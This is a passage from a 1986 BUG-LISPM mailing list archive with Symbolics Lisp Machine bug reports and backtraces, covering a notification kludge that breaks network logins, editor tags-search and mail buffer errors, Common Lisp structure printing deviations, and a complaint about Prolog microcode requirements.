   Arg 2 (ZWEI:STREAM): #<NFILE-INPUT-CHARACTER-STREAM "B:>relatus>examples>intervention>patchdele.lisp" 122543437>

(:METHOD ZWEI:FILE-BUFFER-MIXIN :REVERT):  (P.C. = 114)
   Arg 0 (SELF): #<FILE-BUFFER "patchdele.lisp >relatus>examples>intervention B:" 13300050>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:FILE-BUFFER-MIXIN -- 9. IV's, 0. FL's 170424075>
   Arg 2 (SI:OPERATION): :REVERT

ZWEI:FIND-FILE:  (P.C. = 310)  (from RL: UTILS; RZWEI)
   Arg 0 (ZWEI:PATHNAME): #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">
   Arg 1 (ZWEI:SELECT-P): NIL

ZWEI:FIND-FILE:  (encapsulated for ADVISE)  (from RL: UTILS; RZWEI)
   Rest arg (ARGLIST): (#<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST"> NIL)

ZWEI:FIND-BUFFER-WITH-PATHNAME:  (P.C. = 40)
   Arg 0 (ZWEI:PATHNAME): #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">
   Arg 1 (ZWEI:DEFAULTS): NIL
   Arg 2 (ZWEI:CREATE-P): :WARN
   Arg 3 (ZWEI:LOAD-P): T

ZWEI:FIND-OR-CREATE-BUFFER:  (P.C. = 164)
   Arg 0 (ZWEI:INTERVAL): NIL
   Arg 1 (ZWEI:NAME): NIL
   Arg 2 (ZWEI:PATHNAME): #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">
   Arg 3 (ZWEI:WINDOW): NIL
   Arg 4 (ZWEI:START): :BEGINNING
   Arg 5 (ZWEI:DEFAULTS): NIL
   Arg 6 (ZWEI:CREATE-P): :WARN
   Arg 7 (ZWEI:LOAD-P): T
   Arg 8 (ZWEI:CREATE-OPTIONS): NIL

ZWEI:OPEN-EDITOR-STREAM:  (P.C. = 102)
   Rest arg: (:START :BEGINNING :LOAD-P T :PATHNAME #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">)

MAKE-PATCHES-TO-DICTIONARY-FROM-BUFFER-INTERNAL:  (P.C. = 66)  (from RL: DICTIONARY; PATCHDICT)
   Arg 0 (ACTION): DELETE
   Arg 1 (PATHNAME): "RL:INT;PATCHDELE.LiSP"
   Local 1 (PATHNAME): #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">
   --Defaulted args:--
   Arg 2 (PRINT-WORDS-P): NIL

MAKE-PATCHES-TO-DICTIONARY-FROM-BUFFER:  (P.C. = 10)  (from RL: DICTIONARY; PATCHDICT)
   Arg 0 (ADD-BUFFER): "RL:INT;PATCHADD.LiSP"
   Arg 1 (DEL-BUFFER): "RL:INT;PATCHDELE.LiSP"

PATCH-DICTIONARY-FROM-FILES:  (P.C. = 43)  (from RL: DICTIONARY; PATCHDICT)
   Arg 0 (ADD-PATCH): "RL:INT;PATCHADD.LiSP"
   Arg 1 (DEL-PATCH): "RL:INT;PATCHDELE.LiSP"
   --Defaulted args:--
   Arg 2 (DELETE-P): NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (PATCH-DICTIONARY-FROM-FILES "RL:INT;PATCHADD.LiSP" "RL:INT;PATCHDELE.LiSP")
   Local 0 (SI:FORM): NIL
   Arg 1 (SI:ENV): NIL
   --Defaulted args:--
   Arg 2 (SI:HOOK): NIL

EVAL-WHEN:  (P.C. = 34)
   Arg 0 (SI:.FORM.): (EVAL-WHEN (LOAD EVAL) (LOGIN-SETQ *PRINT-ENTRIES-WHEN-PATCHING-LEXICON* NIL ZWEI:*INSPECT-PARSE-P* NIL ZWEI:*LOAD-FILE-INTO-ZMACS-IF-NON-EXISTENT-BUFFER-ON-PARSE* T *ALWAYS-DISPLAY-LEXICAL-DISAMBIGUATIONS* NIL *SHOW-POSIT-CONSTRAINTS* ...) (PATCH-DICTIONARY-FROM-FILES "RL:INT;PATCHADD.LiSP" "RL:INT;PATCHDELE.LiSP") (PATCH-DICTIONARY-FROM-FILES "RL:IR;PATCHADD.LiSP" "RL:IR;PATCHDELE.LiSP") (PATCH-DICTIONARY-FROM-FILES "RL:EXAMPLES;PATCHADD.LiSP" "RL:EXAMPLES;PATCHDELE.LiSP"))
   Arg 1 (SI:ENV): NIL

SI:*EVAL:  (P.C. = 163)
   Arg 0 (SI:FORM): (EVAL-WHEN (LOAD EVAL) (LOGIN-SETQ *PRINT-ENTRIES-WHEN-PATCHING-LEXICON* NIL ZWEI:*INSPECT-PARSE-P* NIL ZWEI:*LOAD-FILE-INTO-ZMACS-IF-NON-EXISTENT-BUFFER-ON-PARSE* T *ALWAYS-DISPLAY-LEXICAL-DISAMBIGUATIONS* NIL *SHOW-POSIT-CONSTRAINTS* ...) (PATCH-DICTIONARY-FROM-FILES "RL:INT;PATCHADD.LiSP" "RL:INT;PATCHDELE.LiSP") (PATCH-DICTIONARY-FROM-FILES "RL:IR;PATCHADD.LiSP" "RL:IR;PATCHDELE.LiSP") (PATCH-DICTIONARY-FROM-FILES "RL:EXAMPLES;PATCHADD.LiSP" "RL:EXAMPLES;PATCHDELE.LiSP"))
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

SI:READFILE-INTERNAL:  (P.C. = 142)
   Arg 0: #<NFILE-INPUT-CHARACTER-STREAM "B:>rhhu>RELINIT.lisp" 103414774>
   Arg 1 (SI:PKG): NIL
   Arg 2 (SI:NO-MSG-P): NIL
   Rest arg: NIL

FS:LOAD-STREAM:  (P.C. = 16)
   Arg 0 (FS:STREAM): #<NFILE-INPUT-CHARACTER-STREAM "B:>rhhu>RELINIT.lisp" 103414774>
   Arg 1 (FS:PKG): NIL
   Arg 2 (FS:NO-MSG-P): NIL

LOAD:  (P.C. = 124)
   Arg 0 (FS:PATHNAME): #<LMFS-PATHNAME "B:>rhhu>RELINIT.lisp">
   Arg 1 (FS:PKG): NIL
   Arg 2 (FS:NONEXISTENT-OK-FLAG): NIL
   Arg 3 (FS:DONT-SET-DEFAULT-P): NIL
   Arg 4 (FS:NO-MSG-P): NIL

(:PROPERTY SI:COM-LOAD-FILE SI:CP-FUNCTION):  (P.C. = 364)
   Arg 0 (SI:FILE-SPEC): (#<LMFS-PATHNAME "B:>rhhu>RELINIT.lisp">)
   Arg 1 (COMPILE): :NEVER
   Arg 2 (SI:LOADER): :USE-CANONICAL-TYPE
   Arg 3 (SI:PKG): NIL
   Arg 4 (SI:QUERY): :NO
   Arg 5 (SI:SILENTLY): NIL

SI:COM-LOAD-FILE:  (P.C. = 40)
   Arg 0 (SI:FILE-SPEC): (#<LMFS-PATHNAME "B:>rhhu>RELINIT.lisp">)
   Rest arg: NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (SI:COM-LOAD-FILE (QUOTE (#<LMFS-PATHNAME "B:>rhhu>RELINIT.lisp">)))
   Local 0 (SI:FORM): NIL
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 114100073>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 114100100>

SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
   Arg 0 (SI:NAME): "Lisp Top Level"
   Arg 1 (SI:ABORT-FUNCTION): NIL
   Arg 2 (SI:READ-FUNCTION): NIL
   Arg 3 (SI:EVAL-FUNCTION): NIL
   Arg 4 (SI:PRINT-FUNCTION): NIL

SI:LISP-COMMAND-LOOP:  (P.C. = 67)
   Arg 0: #<LISP-LISTENER Lisp Listener 4 16511667 exposed>
   Rest arg: (:NAME "Lisp Top Level")

SI:LISP-TOP-LEVEL1:  (P.C. = 5)
   Arg 0 (SI:STREAM): #<LISP-LISTENER Lisp Listener 4 16511667 exposed>

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   --Defaulted args:--
   Arg 0 (IGNORE): NIL
21-Feb-86 12:57:40-EST,2504;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 21 Feb 86 12:57-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM ([192.10.41.45]) by MIT-ZERMATT.ARPA via INTERNET with SMTP id 25191; 21 Feb 86 12:58:28-EST
Received: from NEPONSET.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 535; Fri 21-Feb-86 12:57:47-EST
Date: Fri, 21 Feb 86 13:04 EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: CWH brain-damage in NETI:NETWORK-TERMINAL-SERVER
To: CWH@MIT-REAGAN.ARPA, BUG-LISPM@MIT-ZERMATT.ARPA
In-Reply-To: <860207142001.1.FILE-SERVER@MIT-ZERMATT.ARPA>
Message-ID: <860221130443.5.DCP@NEPONSET.SCRC.Symbolics.COM>

    Date: Fri, 7 Feb 86 14:20 EST
    From: CWH@MIT-REAGAN.ARPA

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, Macsyma 318.12,
    6-1-Patches 1.9, MLSite 11.0, Mailer 43.6, Imagen Spooler 5.4,
    microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
    FEP0:>v127-info.flod(2), Network-Security patch, Server-Finger patch,
    File system updater, on Zermatt:

    The following code in the function NETI:NETWORK-TERMINAL-SERVER is a
    total kludge which never should have made it into the release.

	   ;; Wait until the notification is delivered, so that it doesn't appear on the newly
	   ;; arrived terminal.  We really only have to wait until the value of *REMOTE-TERMINALS*
	   ;; has been read by the notification delivery process.
	   (IF (EQ REMOTE-LOGIN-ON :NOTIFY)
	       (PROCESS-WAIT "Deliver Notification"
			     #'(LAMBDA ()
				 (STRING-EQUAL
				   (PROCESS-WHOSTATE TV:*NOTIFICATION-PROCESS*)
				   "Notification Wait"))))

    When the user option TV:*ALLOW-POP-UP-NOTIFICATIONS* was introduced, a
    new whostate "Pop Up Wait" was created and this screwed up the kludge
    communication mechanism.  The buggy result is that if the notification
    process is in the state "Pop Up Wait", network logins will not work.

    This kludge should be replaced with a formal communication variable.
    Furthermore, the notification delivery process should deliver the
    notification to all remote terminals first, then set the variable, and
    then deliver to the main console.

I think it should deliver it to the main console first.  Consider a
remote terminal in a more break.

    [MIT: File server maintainers can fix this by changing the PROCESS-WAIT
    to be PROCESS-WAIT-WITH-TIMEOUT.]

21-Feb-86 13:09:08-EST,1345;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 21 Feb 86 13:08-EST
Received: from SNOWBIRD.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 25195; Fri 21-Feb-86 13:09:54-EST
Date: Fri, 21 Feb 86 13:09 EST
From: Carl W. Hoffman <CWH@MIT-ZERMATT.ARPA>
Subject: CWH brain-damage in NETI:NETWORK-TERMINAL-SERVER
To: DCP@SCRC-QUABBIN.ARPA, BUG-LISPM@MIT-ZERMATT.ARPA
In-Reply-To: <860221130443.5.DCP@NEPONSET.SCRC.Symbolics.COM>
Message-ID: <860221130942.8.CWH@SNOWBIRD.LCS.MIT.EDU>

    Date: Fri, 21 Feb 86 13:04 EST
    From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>

    I think it should deliver it to the main console first.  Consider a
    remote terminal in a more break.

Unless some code has changed that I don't know about, being in a more break
shouldn't make any difference.  The notification delivery process never waits
an arbitrary amount of time; if it does, that's a recently introduced bug.  If
the notification can't be delivered synchronously, it spins off a process to
blast it onto the stream itself.

Another way of fixing the original problem is rather than having
NETI:NETWORK-TERMINAL-SERVER wait for the notification delivery to complete,
invent an alternate version of TV:NOTIFY which allows you to say "deliver this
notification to every console except this one".
21-Feb-86 13:17:09-EST,7260;000000000000
Received: from DUANE.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 21 Feb 86 13:17-EST
Date: Fri, 21 Feb 86 13:18 EST
From: David Chapman <Zvona@OZ.AI.MIT.EDU>
Subject: possibilities buffer blowout
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860221131802.2.ZVONA@DUANE.AI.MIT.EDU>

In Symbolics 3670 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.2, Macsyma 310.35, microcode TMC5-IO4-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-info.flod(2), FEP0:>v127-debug.flod(1), on Lisp Machine Duane Allman:

I did m-X Tags Search make-constant-justification, then m-X Tags Query
Replace make-constant-justification => immutable-justification, then c--
c-., then m-X Tags Search make-constant-justification again, and it blew
out.  I hadn't delete possibilities buffers or anything weird like that.
I don't know if this is reproducible.

>>Error: The object #<EDITOR 23373247> received a :FIND-SPECIAL-BUFFER message, which went unclaimed.
         The rest of the message was (:TAGS-SEARCH T :SET-TAG-TABLE-BUFFER
                                      #<SYSTEM-TAG-TABLE-BUFFER "*Tag-Table-1*" 116400441>
                                      :SET-SEARCH-FUNCTION ZWEI:SEARCH :SET-SEARCH-KEY
                                      "make-constant-justification" :SET-SEARCH-STRING
                                      "make-constant-justification")
While in the function ZWEI:PUSH-POSSIBILITIES-BUFFER  ZWEI:SELECT-TAG-TABLE-USER  ZWEI:COM-TAGS-SEARCH

ZWEI:PUSH-POSSIBILITIES-BUFFER:  (P.C. = 10)
   Arg 0 (ZWEI:ACTION): :START-EDITING
   Arg 1 (ZWEI:TYPE): :TAGS-SEARCH
   Rest arg (ZWEI:SET-OPTIONS): (:SET-TAG-TABLE-BUFFER
                                 #<SYSTEM-TAG-TABLE-BUFFER "*Tag-Table-1*" 116400441>
                                 :SET-SEARCH-FUNCTION ZWEI:SEARCH :SET-SEARCH-KEY
                                 "make-constant-justification" :SET-SEARCH-STRING
                                 "make-constant-justification")
   Local 3 (ZWEI:BUFFER): #<EDITOR 23373247>

ZWEI:SELECT-TAG-TABLE-USER:  (P.C. = 13)
   Arg 0 (ZWEI:TYPE): :TAGS-SEARCH
   Rest arg (ZWEI:OPTIONS): (:SET-SEARCH-FUNCTION ZWEI:SEARCH :SET-SEARCH-KEY
                             "make-constant-justification" :SET-SEARCH-STRING
                             "make-constant-justification")

ZWEI:COM-TAGS-SEARCH:  (P.C. = 17)

ZWEI:COM-EXTENDED-COMMAND:  (P.C. = 27)

ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
   Arg 0 (ZWEI:COMMAND): ZWEI:COM-EXTENDED-COMMAND
   Arg 1 (ZWEI:CHAR): 600
   Arg 2 (ZWEI:PREFIX-CHAR): NIL
   Arg 3 (ZWEI:HOOK-LIST): NIL

ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
   Arg 0 (ZWEI:CH): 600

(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
   Arg 0 (SELF): #<EDITOR 23373247>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:EDITOR -- 12. IV's, 0. FL's 120376216>
   Arg 2 (SI:OPERATION): :EDIT
   Arg 3 (ZWEI:TOP-LEVEL-P): NIL
   Arg 4 (ZWEI:DESCRIPTION): NIL

ZWEI:COMMAND-LOOP:  (P.C. = 73)
   Arg 0 (ZWEI:COMTAB): #<COMTAB Control-R 144714126>
   Arg 1 (ZWEI:WINDOW): #<WINDOW 145006541>
   --Defaulted args:--
   Arg 2 (ZWEI:TYPE): ZWEI:EDITOR
   Arg 3 (ZWEI:DESCRIPTION): NIL

ZWEI:CONTROL-R:  (P.C. = 24)

ZWEI:QUERY-REPLACE-INTERNAL:  (P.C. = 431)
   Arg 0 (ZWEI:BP): ("				      (immutable-premise))))" 29 :NORMAL)
   Arg 1 (ZWEI:QUERY-FROM): "make-constant-justification"
   Arg 2 (ZWEI:QUERY-TO): "immutable-premise"
   Arg 3 (FUNCTION): #<DTP-COMPILED-FUNCTION ZWEI:QUERY-REPLACE-SEARCH 31621125>
   Arg 4 (ZWEI:BREAKS): NIL
   Arg 5 (ZWEI:BUFFER): #<FILE-BUFFER "runtime.lisp >zvona>ddl B:" 116400745>
   Arg 6 (ZWEI:START-BP): (";;; -*- Mode: LISP; Package: DDLI; Base: 10. -*-" 0 :NORMAL)

ZWEI:QUERY-REPLACE:  (P.C. = 52)
   Arg 0 (ZWEI:BP): ("				      (immutable-premise))))" 29 :NORMAL)
   Arg 1: "make-constant-justification"
   Arg 2: "immutable-premise"
   Arg 3 (ZWEI:BREAKS): NIL
   Arg 4 (ZWEI:BUFFER): #<FILE-BUFFER "runtime.lisp >zvona>ddl B:" 116400745>
   Arg 5 (ZWEI:START-BP): (";;; -*- Mode: LISP; Package: DDLI; Base: 10. -*-" 0 :NORMAL)

(:METHOD ZWEI:TAGS-QUERY-REPLACE-BUFFER :QUERY-REPLACE):  (P.C. = 13)
   Arg 0 (SELF): #<TAGS-QUERY-REPLACE-BUFFER "*Tags-Query-Replace-2*" 116402554>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:TAGS-QUERY-REPLACE-BUFFER -- 3. IV's, 6. FL's 120435535>
   Arg 2 (SI:OPERATION): :QUERY-REPLACE
   Arg 3 (ZWEI:BP): (";;; -*- Mode: LISP; Package: DDLI; Base: 10. -*-" 0 :NORMAL)
   Arg 4 (ZWEI:BUFFER): #<FILE-BUFFER "runtime.lisp >zvona>ddl B:" 116400745>

(:METHOD ZWEI:TAGS-QUERY-REPLACE-BUFFER :SELECT-POSSIBILITY):  (P.C. = 22)
   Arg 0 (SELF): #<TAGS-QUERY-REPLACE-BUFFER "*Tags-Query-Replace-2*" 116402554>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:TAGS-QUERY-REPLACE-BUFFER -- 3. IV's, 6. FL's 120435535>
   Arg 2 (SI:OPERATION): :SELECT-POSSIBILITY
   Arg 3 (ZWEI:STARTING-BUFFER): #<FILE-BUFFER "defsystem.lisp >Zvona>DDL B:" 116400274>

(:METHOD ZWEI:TAG-TABLE-SUBNODE :SELECT-POSSIBILITY):  (P.C. = 7)
   Arg 0 (SELF): #<FILE-TAG-TABLE-SUBNODE 23373054>
   Arg 1 (SYS:SELF-MAPPING-TABLE): ZWEI:TAG-TABLE-SUBNODE
   Arg 2 (SI:OPERATION): :SELECT-POSSIBILITY

ZWEI:NEXT-POSSIBILITY:  (P.C. = 22)
   Arg 0 (ZWEI:ACTION): :START-EDITING

ZWEI:PUSH-POSSIBILITIES-BUFFER:  (P.C. = 32)
   Arg 0 (ZWEI:ACTION): :START-EDITING
   Arg 1 (ZWEI:TYPE): :TAGS-QUERY-REPLACE
   Rest arg (ZWEI:SET-OPTIONS): (:SET-TAG-TABLE-BUFFER
                                 #<SYSTEM-TAG-TABLE-BUFFER "*Tag-Table-1*" 116400441>
                                 :SET-FROM "make-constant-justification" :SET-TO
                                 "immutable-premise" :SET-DELIMITED NIL)

ZWEI:SELECT-TAG-TABLE-USER:  (P.C. = 13)
   Arg 0 (ZWEI:TYPE): :TAGS-QUERY-REPLACE
   Rest arg (ZWEI:OPTIONS): (:SET-FROM "make-constant-justification" :SET-TO
                             "immutable-premise" :SET-DELIMITED NIL)

ZWEI:SETUP-TAGS-QUERY-REPLACE:  (P.C. = 12)
   Arg 0 (ZWEI:TYPE): :TAGS-QUERY-REPLACE
   Arg 1 (ZWEI:FROM): "make-constant-justification"
   Arg 2 (ZWEI:TO): "immutable-premise"
   Arg 3 (ZWEI:DELIMITED): NIL

ZWEI:COM-TAGS-QUERY-REPLACE:  (P.C. = 15)

ZWEI:COM-EXTENDED-COMMAND:  (P.C. = 27)

ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
   Arg 0 (ZWEI:COMMAND): ZWEI:COM-EXTENDED-COMMAND
   Arg 1 (ZWEI:CHAR): 600
   Arg 2 (ZWEI:PREFIX-CHAR): NIL
   Arg 3 (ZWEI:HOOK-LIST): NIL

ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
   Arg 0 (ZWEI:CH): 600

(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:EDITOR -- 12. IV's, 0. FL's 120377766>
   Arg 2 (SI:OPERATION): :EDIT
   --Defaulted args:--
   Arg 3 (ZWEI:TOP-LEVEL-P): T
   Arg 4 (ZWEI:DESCRIPTION): NIL

(:METHOD ZWEI:TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:TOP-LEVEL-EDITOR -- 13. IV's, 1. FL's 120377366>
   Arg 2 (SI:.OPERATION.): :EDIT
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

ZWEI:ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   --Defaulted args:--
   Arg 0 (IGNORE): NIL
21-Feb-86 14:22:33-EST,1419;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 21 Feb 86 14:22-EST
Received: from HARVEY.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 25204; Fri 21-Feb-86 14:21:52-EST
Date: Fri, 21 Feb 86 14:21 EST
From: tar@MIT-MC.ARPA
Sender: SLN@MIT-MC.ARPA
Subject: Common Lisp Structure Printing and Reading Bugs
To: BUG-LISPM@MIT-ZERMATT.ARPA
cc: tar@MIT-MC.ARPA, sln@MIT-MC.ARPA
Message-ID: <860221142130.1.MEDG.SLN@HARVEY.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12,
6-1-Patches 1.10, MLSite 12.2, microcode TMC5-IO4-ST506-MIC 336, FEP 127,
FEP0:>V127-LISP.FLOD(2), FEP0:>V127-LOADERS.FLOD(3),
FEP0:>V127-INFO.FLOD(2), FEP0:>V127-TESTS.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), FEP0:>V127-DISK.FLOD(4), on Lisp Machine Harvey:

1) The Common Lisp defstruct default printing function does not obey the
CL standard.  According to the reference manual (p. 314), the default
printing form for structures should be using #S syntax.  Instead, #< ...>
is used.

2) #S syntax for reading in structures also doesn't work correctly.  For
the following structure:

	(defstruct st
	  one two)

the following syntax should allow it to be read in:

	#S(ST one 1 two 2)

The Lispm implementation requires the following:

	#S(ST :one 1 :two 2)

The CL Manual explicitly notes that the keyword transformation is to
be done by the system (p. 357).

21-Feb-86 14:43:13-EST,2625;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 21 Feb 86 14:43-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 23636; Fri 21-Feb-86 14:45:34-EST
Date: Fri, 21 Feb 86 14:43 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: Prolog & lispms without XSQ's
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860221144338.2.CJL@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.3, Macsyma 310.35, Prolog 12.1, microcode TMC5-IO4-COL-MIC 353,
FEP 127, FEP0:>V127-LISP.FLOD(2), FEP0:>V127-LOADERS.FLOD(3),
FEP0:>V127-INFO.FLOD(2), FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

Is there a fundamental reason why there is no prolog microcode for
machines that don't have XSQ's, or is it marketing ploy to sell
hardware?  Couldn't some other microcode feature have been removed to
make room for prolog stuff? All of our machines have only one kind of
disk, and most no tape drives on them at all. Couldn't some tape support
be removed to make room for prolog support? 

It seems pretty sad that an expensive hardware feature is required to
run a particular language on a 3600. Suppose there isn't any more
microcode room. How about some macrocode. I'd settle for a slow version
of prolog than no version at all. Is Symbolics really willing to say,
"Prolog doesn't run on all Symbolics lisp machines. It runs on a
particular subset of lisp machines that have extended sequencers, which
aren't standard and cost mucho kilobucks more."

>>Trap: Illegal instruction 303777 (SYS:%PROLOG-EXECUTE).
While in the function PL-COMPILER::EXECUTE-CLAUSE-INTERNAL  PL-COMPILER::EXECUTE-CLAUSE  PL-COMPILER::EXECUTE-QUERY

PL-COMPILER::EXECUTE-CLAUSE-INTERNAL:  (P.C. = 20)
   Arg 0 (CLAUSE): #<DTP-COMPILED-FUNCTION (:PROLOG-PREDICATE |:-| 0.) 23033444>
   Local 1 (PL-COMPILER::FP.1): NIL
   Local 2 (PL-COMPILER::FP.2): NIL
   Local 3 (PL-COMPILER::FP.3): NIL
   Local 4 (PL-COMPILER::FP.4): NIL
   Local 5 (PL-COMPILER::FP.5): NIL
   Local 6 (PL-COMPILER::FP.6): NIL
   Local 7 (PL-COMPILER::FP.7): NIL
   Local 8 (PL-COMPILER::FP.8): NIL
   Local 9 (PL-COMPILER::FP.9): NIL
   Local 10 (PL-COMPILER::FP.10): NIL
   Local 11 (PL-COMPILER::FP.11): NIL
   Local 12 (PL-COMPILER::FP.12): NIL
   Local 13 (PL-COMPILER::FP.13): NIL
   Local 14 (PL-COMPILER::FP.14): NIL
   Local 15 (PL-COMPILER::FP.15): NIL
   Local 16 (PL-COMPILER::FP.16): NIL
   Local 17 (PL-COMPILER::FP.17): NIL
   Local 18 (PL-COMPILER::FP.18): NIL
   Local 19 (PL-COMPILER::FP.19): NIL
   Local 20 (PL-COMPILER::FP.20): NIL
21-Feb-86 16:01:57-EST,6755;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 21 Feb 86 16:01-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 21 FEB 86  15:58:23 EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 23663; Fri 21-Feb-86 16:00:21-EST
Date: Fri, 21 Feb 86 15:59 EST
From: Roger Hurwitz <rhhu@MIT-REAGAN.ARPA>
Subject: >>Error: The object #<NODE 146177675> received a :BUFFER-INIT-OPTIONS message, which went unclaimed.
To: BUG-LISPM@MIT-REAGAN.ARPA
Message-ID: <860221155949.4.RHHU@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.3, Macsyma 310.35, Experimental RELATUS 147.8,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

I used a bug reporting facility that calls BUG and this error occurred.

>>Error: The object #<NODE 146177675> received a :BUFFER-INIT-OPTIONS message, which went unclaimed.
         The rest of the message was ()
While in the function (:METHOD ZWEI:STANDALONE-MAIL-OR-DIRED-MIXIN :SELECT-SPECIAL-BUFFER)  ZWEI:COM-MAIL-INTERNAL  (:METHOD ZWEI:MAIL-TOP-LEVEL-EDITOR :MAIL)

(:METHOD ZWEI:STANDALONE-MAIL-OR-DIRED-MIXIN :SELECT-SPECIAL-BUFFER):  (P.C. = 7)
   Arg 0 (SELF): #<MAIL-TOP-LEVEL-EDITOR 145657070>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:STANDALONE-MAIL-OR-DIRED-MIXIN -- 1. IV's, 0. FL's 120415415>
   Arg 2 (SI:OPERATION): :SELECT-SPECIAL-BUFFER
   Arg 3 (ZWEI:TYPE): :MAIL
   Arg 4 (ZWEI:REVERT-P): T
   Rest arg (ZWEI:SETS): (:SET-INITIAL-DESTINATION "BUG-LISPM@REAGAN" :SET-INITIAL-BODY "In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.3, Macsyma 310.35, Experimental RELATUS 147.8,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

" :SET-INITIAL-INDEX NIL :SET-BUG-REPORT T :SET-SETUP-SUBJECT (T :INIT :BUG) ...)
   Local 6 (ZWEI:KEY): NIL
   Local 7 (ZWEI:VAL): NIL
   Local 8: (:SET-INITIAL-DESTINATION "BUG-LISPM@REAGAN" :SET-INITIAL-BODY "In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.3, Macsyma 310.35, Experimental RELATUS 147.8,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

" :SET-INITIAL-INDEX NIL :SET-BUG-REPORT T :SET-SETUP-SUBJECT (T :INIT :BUG) ...)
   Local 9 (ZWEI:LEGAL-OPTIONS): #<NODE 146177675>

